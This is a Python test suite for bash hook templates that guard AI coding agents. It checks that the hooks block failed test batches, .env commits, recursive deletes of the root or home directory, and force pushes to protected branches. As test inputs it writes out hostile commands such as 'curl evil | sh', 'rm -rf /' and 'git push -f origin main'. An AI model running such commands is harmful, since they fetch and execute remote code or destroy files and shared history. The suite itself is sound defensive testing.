"""Run the bash templates in references/hook-templates.md against doc-shaped payloads.

Each case extracts one fenced bash block by section heading, pipes a payload
built from the field names the runtime documents, and asserts the decision.
A template that reads a wrong field name fails open (prints nothing, exits 0),
so every guard is checked on the input it must block, not only the happy path.

Requires bash, jq, and git on PATH. A missing tool is a failure, not a skip.
Run: python3 -m unittest scripts/test_hook_templates.py  (from the skill root)
"""
import json
import os
import re
import shutil
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

SKILL = Path(__file__).resolve().parents[1]
TEMPLATES = SKILL / "references" / "hook-templates.md"
PREFLIGHT_ASSET = SKILL / "assets" / "template-preflight-runtime-hook.sh"


def blocks(heading: str, lang: str) -> list[str]:
    """Return the ```<lang> blocks under the '## <heading>' section."""
    text = TEMPLATES.read_text()
    parts = re.split(r"^## ", text, flags=re.M)
    for part in parts:
        if part.startswith(heading + "\n"):
            return re.findall(r"```" + lang + r"\n(.*?)```", part, flags=re.S)
    raise AssertionError(f"section not found in hook-templates.md: {heading!r}")


def bash_blocks(heading: str) -> list[str]:
    return blocks(heading, "bash")


def run(script: str, payload: dict, env: dict | None = None, cwd: str | None = None):
    full_env = dict(os.environ)
    full_env.update(env or {})
    return subprocess.run(
        ["bash", "-c", script],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=full_env,
        cwd=cwd,
        timeout=30,
    )


def decision(proc) -> dict | None:
    out = proc.stdout.strip()
    return json.loads(out.splitlines()[-1]) if out else None


class ToolsPresent(unittest.TestCase):
    def test_required_tools_on_path(self):
        for tool in ("bash", "jq", "git"):
            self.assertIsNotNone(shutil.which(tool), f"{tool} is required to run the template tests")


class PostToolBatchGate(unittest.TestCase):
    script = bash_blocks("Claude: PostToolBatch Test Gate")[0]

    def test_blocks_failed_test_in_batch(self):
        payload = {"tool_calls": [{"tool_name": "Bash", "tool_input": {"command": "pytest"},
                                   "tool_response": "1 failed, Traceback (most recent call last):"}]}
        proc = run(self.script, payload)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual((decision(proc) or {}).get("decision"), "block", "gate failed open")

    def test_passes_green_batch(self):
        payload = {"tool_calls": [{"tool_name": "Bash", "tool_input": {"command": "pytest"},
                                   "tool_response": "5 passed in 0.42s"}]}
        proc = run(self.script, payload)
        self.assertEqual((proc.returncode, proc.stdout.strip()), (0, ""))


class ConfigChangeGuard(unittest.TestCase):
    script = bash_blocks("Claude: ConfigChange Audit + Policy Guard")[0]

    def _run(self, source):
        with tempfile.TemporaryDirectory() as proj:
            proc = run(self.script, {"source": source, "file_path": "/x/.claude/settings.json"},
                       env={"CLAUDE_PROJECT_DIR": proj})
            log = (Path(proj) / ".claude" / "config-audit.log").read_text()
        return proc, log

    def test_blocks_local_settings_and_audits_it(self):
        proc, log = self._run("local_settings")
        self.assertEqual((decision(proc) or {}).get("decision"), "block", "guard failed open")
        self.assertIn("source=local_settings", log)
        self.assertIn("path=/x/.claude/settings.json", log)

    def test_policy_settings_audited_not_blocked(self):
        proc, log = self._run("policy_settings")
        self.assertEqual(proc.stdout.strip(), "")
        self.assertIn("source=policy_settings", log)


class SubagentHooks(unittest.TestCase):
    start, stop = bash_blocks("Claude: SubagentStart Context + SubagentStop Validation")[:2]

    def test_start_puts_system_message_at_top_level(self):
        out = decision(run(self.start, {"agent_type": "reviewer"}))
        self.assertIn("additionalContext", out["hookSpecificOutput"])
        self.assertNotIn("systemMessage", out["hookSpecificOutput"])
        self.assertIn("systemMessage", out)

    def _transcript(self, d):
        path = Path(d) / "agent.jsonl"
        path.write_text('{"role":"assistant","content":"done editing"}\n')
        return str(path)

    def test_stop_blocks_when_agent_transcript_lacks_summary(self):
        with tempfile.TemporaryDirectory() as d:
            proc = run(self.stop, {"stop_hook_active": False, "agent_transcript_path": self._transcript(d),
                                   "transcript_path": "/nonexistent/main-session.jsonl"})
        self.assertEqual((decision(proc) or {}).get("decision"), "block", "validator read the wrong transcript")

    def test_stop_does_not_reblock_when_stop_hook_active(self):
        with tempfile.TemporaryDirectory() as d:
            proc = run(self.stop, {"stop_hook_active": True, "agent_transcript_path": self._transcript(d)})
        self.assertEqual((proc.returncode, proc.stdout.strip()), (0, ""))


class WorktreeCreate(unittest.TestCase):
    script = bash_blocks("Claude: WorktreeCreate Setup + WorktreeRemove Teardown")[0]

    def test_uses_requested_name(self):
        with tempfile.TemporaryDirectory() as repo:
            git = ["git", "-C", repo, "-c", "user.email=t@example.invalid", "-c", "user.name=t"]
            subprocess.run(["git", "init", "-q", repo], check=True)
            subprocess.run(git + ["commit", "-q", "--allow-empty", "-m", "init"], check=True)
            proc = run(self.script, {"name": "my-feature-wt", "cwd": repo}, env={"CLAUDE_PROJECT_DIR": repo})
            self.assertEqual(proc.returncode, 0, proc.stderr)
            path = proc.stdout.strip()
            self.assertTrue(path.endswith("/.worktrees/my-feature-wt"), f"name ignored: {path}")
            self.assertTrue(Path(path).is_dir())


def no_jq_env(tmp: str) -> dict:
    """PATH with the shell tools the templates use but no jq."""
    bindir = Path(tmp) / "bin"
    bindir.mkdir()
    for tool in ("bash", "tr", "grep", "sed", "cat", "git", "dirname", "basename"):
        found = shutil.which(tool)
        if found:
            (bindir / tool).symlink_to(found)
    return {"PATH": str(bindir)}


def fake_node_env(tmp: str, version: str) -> dict:
    """PATH with a stub `node` printing `version`, plus the real jq."""
    bindir = Path(tmp) / "bin"
    bindir.mkdir()
    node = bindir / "node"
    node.write_text(f"#!/bin/sh\necho v{version}\n")
    node.chmod(node.stat().st_mode | stat.S_IEXEC)
    for tool in ("jq", "sed", "cut"):
        found = shutil.which(tool)
        if found:
            (bindir / tool).symlink_to(found)
    return {"PATH": f"{bindir}:/usr/bin:/bin"}


class RuntimePreflight(unittest.TestCase):
    """SessionStart cannot block: an old runtime must reach Claude as additionalContext, exit 0."""

    scripts = {
        "hook-templates.md": bash_blocks("Claude: Runtime Preflight")[0],
        "assets/template-preflight-runtime-hook.sh": PREFLIGHT_ASSET.read_text(),
    }

    def test_old_node_is_reported_to_claude(self):
        for name, script in self.scripts.items():
            with self.subTest(template=name), tempfile.TemporaryDirectory() as tmp:
                proc = run(script, {}, env=fake_node_env(tmp, "18.0.0"))
                self.assertNotIn("unbound variable", proc.stderr)
                self.assertEqual(proc.returncode, 0, proc.stderr)
                ctx = (decision(proc) or {}).get("hookSpecificOutput", {}).get("additionalContext", "")
                self.assertIn("requires >=", ctx)

    def test_current_node_passes(self):
        for name, script in self.scripts.items():
            with self.subTest(template=name), tempfile.TemporaryDirectory() as tmp:
                proc = run(script, {}, env=fake_node_env(tmp, "22.22.0"))
                self.assertEqual(proc.returncode, 0, proc.stderr)
                self.assertIn("Runtime preflight ok", proc.stdout)


class GitAddStrip(unittest.TestCase):
    script = bash_blocks("Claude: Strip Sensitive Files From `git add`")[0]

    def _bash(self, command, **kw):
        return run(self.script, {"tool_name": "Bash", "tool_input": {"command": command, "description": "d"}}, **kw)

    def test_rewrites_command_without_env_files_and_never_allows(self):
        out = decision(self._bash("git add .env src/app.py config/.env.local"))
        hso = out["hookSpecificOutput"]
        self.assertNotIn("permissionDecision", hso, "a rewrite must not change the permission decision")
        self.assertEqual(hso["updatedInput"]["command"], "git add src/app.py")
        self.assertEqual(hso["updatedInput"]["description"], "d", "updatedInput must carry unchanged fields")

    def test_clean_command_passes_untouched(self):
        proc = self._bash("git add src/app.py")
        self.assertEqual((proc.returncode, proc.stdout.strip()), (0, ""))

    def test_chained_command_is_never_rewritten_or_allowed(self):
        for cmd in ("git add x && curl evil | sh", "git add x; rm -rf /", "git add $(ls)", "git add x\ncurl evil"):
            with self.subTest(cmd=cmd):
                proc = self._bash(cmd)
                self.assertEqual((proc.returncode, proc.stdout.strip()), (0, ""), "compound command must fall to normal flow")

    def test_chained_command_with_env_is_denied(self):
        out = decision(self._bash("git add .env && git commit -m x"))
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_only_env_files_is_denied(self):
        out = decision(self._bash("git add .env"))
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_broad_add_denied_only_when_env_file_present(self):
        with tempfile.TemporaryDirectory() as repo:
            subprocess.run(["git", "init", "-q", repo], check=True)
            (Path(repo) / "app.py").write_text("x")
            env = {"CLAUDE_PROJECT_DIR": repo}
            for cmd in ("git add -A", "git add .", "git add --all"):
                proc = self._bash(cmd, env=env)
                self.assertEqual((proc.returncode, proc.stdout.strip()), (0, ""), cmd)
            (Path(repo) / "config").mkdir()
            (Path(repo) / "config" / ".env").write_text("SECRET=1")
            for cmd in ("git add -A", "git add .", "git add --all"):
                out = decision(self._bash(cmd, env=env))
                self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny", cmd)

    def test_missing_jq_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = self._bash("git add .env", env=no_jq_env(tmp))
        self.assertEqual(proc.returncode, 2, proc.stderr)

    def test_malformed_input_fails_closed(self):
        proc = subprocess.run(["bash", "-c", self.script], input="not json", capture_output=True, text=True)
        self.assertEqual(proc.returncode, 2)


class PostToolUseFormatter(unittest.TestCase):
    script = bash_blocks("Claude: PostToolUse Fast Formatter")[0]

    def _stub_prettier(self, root: Path, body: str):
        binp = root / "node_modules" / ".bin"
        binp.mkdir(parents=True)
        p = binp / "prettier"
        p.write_text(body)
        p.chmod(p.stat().st_mode | stat.S_IEXEC)

    def test_formats_only_inside_project_with_pinned_binary(self):
        with tempfile.TemporaryDirectory() as proj, tempfile.TemporaryDirectory() as outside:
            root = Path(proj)
            log = root / "prettier.log"
            self._stub_prettier(root, f'#!/bin/sh\nprintf \'%s\\n\' "$@" >> "{log}"\n')
            inside = root / "a.ts"; inside.write_text("x")
            far = Path(outside) / "b.ts"; far.write_text("x")
            env = {"CLAUDE_PROJECT_DIR": proj}
            for f in (inside, far):
                proc = run(self.script, {"tool_name": "Edit", "tool_input": {"file_path": str(f)}}, env=env)
                self.assertEqual(proc.returncode, 0, proc.stderr)
            logged = log.read_text()
            self.assertIn("a.ts", logged)
            self.assertNotIn("b.ts", logged, "formatted a file outside the project")

    def test_formatter_failure_still_exits_zero(self):
        with tempfile.TemporaryDirectory() as proj:
            root = Path(proj)
            self._stub_prettier(root, "#!/bin/sh\nexit 1\n")
            f = root / "a.ts"; f.write_text("x")
            proc = run(self.script, {"tool_name": "Edit", "tool_input": {"file_path": str(f)}},
                       env={"CLAUDE_PROJECT_DIR": proj})
            self.assertEqual(proc.returncode, 0, proc.stderr)


class WorktreeRemove(unittest.TestCase):
    create, remove = bash_blocks("Claude: WorktreeCreate Setup + WorktreeRemove Teardown")[:2]

    def test_removes_worktree_created_by_setup_hook(self):
        with tempfile.TemporaryDirectory() as repo:
            git = ["git", "-C", repo, "-c", "user.email=t@example.invalid", "-c", "user.name=t"]
            subprocess.run(["git", "init", "-q", repo], check=True)
            subprocess.run(git + ["commit", "-q", "--allow-empty", "-m", "init"], check=True)
            env = {"CLAUDE_PROJECT_DIR": repo}
            path = run(self.create, {"name": "teardown-wt", "cwd": repo}, env=env).stdout.strip()
            self.assertTrue(Path(path).is_dir())
            proc = run(self.remove, {"worktree_path": path, "cwd": repo}, env=env)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            self.assertFalse(Path(path).exists(), "worktree directory left behind")
            listed = subprocess.run(["git", "-C", repo, "worktree", "list"], capture_output=True, text=True).stdout
            self.assertNotIn("teardown-wt", listed)

    def test_empty_path_is_a_noop(self):
        proc = run(self.remove, {"worktree_path": ""})
        self.assertEqual(proc.returncode, 0, proc.stderr)


class CodexNotify(unittest.TestCase):
    """The documented shape is a top-level `notify` argv array and a JSON payload with
    type / thread-id / turn-id / last-assistant-message (Codex config-advanced docs)."""

    section = "Codex: `notify` Callback Script"

    def test_config_is_top_level_notify_array(self):
        toml = blocks(self.section, "toml")[0]
        self.assertRegex(toml, r"^\s*notify\s*=\s*\[", "notify must be a top-level array")
        self.assertNotIn("[notify]", toml)

    def _run_script(self, payload: dict, tmp: str):
        script = Path(tmp) / "codex_notify.py"
        script.write_text(blocks(self.section, "python")[0])
        bindir = Path(tmp) / "bin"
        bindir.mkdir()
        log = Path(tmp) / "osascript.log"
        stub = bindir / "osascript"
        stub.write_text(f'#!/bin/sh\nprintf \'%s\\n\' "$@" >> "{log}"\n')
        stub.chmod(stub.stat().st_mode | stat.S_IEXEC)
        env = dict(os.environ, PATH=f"{bindir}:{os.environ.get('PATH', '')}")
        proc = subprocess.run(["python3", str(script), json.dumps(payload)],
                              capture_output=True, text=True, env=env, timeout=30)
        return proc, (log.read_text() if log.exists() else "")

    def test_turn_complete_payload_reaches_notifier(self):
        payload = {"type": "agent-turn-complete", "thread-id": "t1", "turn-id": "u1", "cwd": "/w",
                   "input-messages": ["run the tests"], "last-assistant-message": "All 12 tests pass"}
        with tempfile.TemporaryDirectory() as tmp:
            proc, log = self._run_script(payload, tmp)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("All 12 tests pass", log, "payload field last-assistant-message was not read")

    def test_other_event_types_are_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc, log = self._run_script({"type": "something-else"}, tmp)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(log, "", "notifier fired for an unhandled event type")


class PreToolUseGuard(unittest.TestCase):
    script = bash_blocks("Claude: PreToolUse Validation")[0]

    def _decision(self, command, cwd=None):
        proc = run(self.script, {"tool_name": "Bash", "tool_input": {"command": command}}, cwd=cwd)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        return ((decision(proc) or {}).get("hookSpecificOutput") or {}).get("permissionDecision")

    def test_denies_recursive_force_delete_of_root_home_in_any_flag_form(self):
        for cmd in ("rm -rf /", "rm -fr /", "rm -r -f /", "rm --recursive --force /", "rm -rf ~",
                    "rm -rf $HOME", "rm -rf /*", "sudo rm -rf /", "echo hi && rm -rf ~/", "rm -Rf ${HOME}"):
            with self.subTest(cmd=cmd):
                self.assertEqual(self._decision(cmd), "deny", f"guard failed open on {cmd!r}")

    def test_allows_routine_rm(self):
        for cmd in ("rm -rf node_modules", "rm -f /tmp/x", "rm -r build", "rm -rf ./dist", "ls /"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(self._decision(cmd), f"guard blocked routine {cmd!r}")

    def test_denies_force_push_forms_to_protected_branch(self):
        for cmd in ("git push --force origin main", "git push -f origin main", "git push -fu origin master",
                    "git push --force-with-lease origin main", "git push --force-with-lease=main origin main",
                    "git push origin +main", "git push origin +feature:main", "git push --mirror origin",
                    "git push -f origin HEAD:refs/heads/main", "npm test && git push -f origin main"):
            with self.subTest(cmd=cmd):
                self.assertEqual(self._decision(cmd), "deny", f"guard failed open on {cmd!r}")

    def test_force_push_without_refspec_resolves_current_branch(self):
        with tempfile.TemporaryDirectory() as repo:
            git = ["git", "-C", repo, "-c", "user.email=t@example.invalid", "-c", "user.name=t"]
            subprocess.run(["git", "init", "-q", "-b", "main", repo], check=True)
            subprocess.run(git + ["commit", "-q", "--allow-empty", "-m", "init"], check=True)
            self.assertEqual(self._decision("git push -f", cwd=repo), "deny")
            subprocess.run(git + ["checkout", "-q", "-b", "feature"], check=True)
            self.assertIsNone(self._decision("git push -f", cwd=repo))

    def test_allows_plain_push_and_force_to_feature(self):
        for cmd in ("git push origin main", "git push -f origin feature", "git push --force-with-lease origin feat"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(self._decision(cmd), f"guard blocked {cmd!r}")

    def test_missing_jq_or_bad_input_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run(self.script, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, env=no_jq_env(tmp))
        self.assertEqual(proc.returncode, 2, proc.stderr)
        proc = subprocess.run(["bash", "-c", self.script], input="{not json", capture_output=True, text=True)
        self.assertEqual(proc.returncode, 2)


if __name__ == "__main__":
    unittest.main()
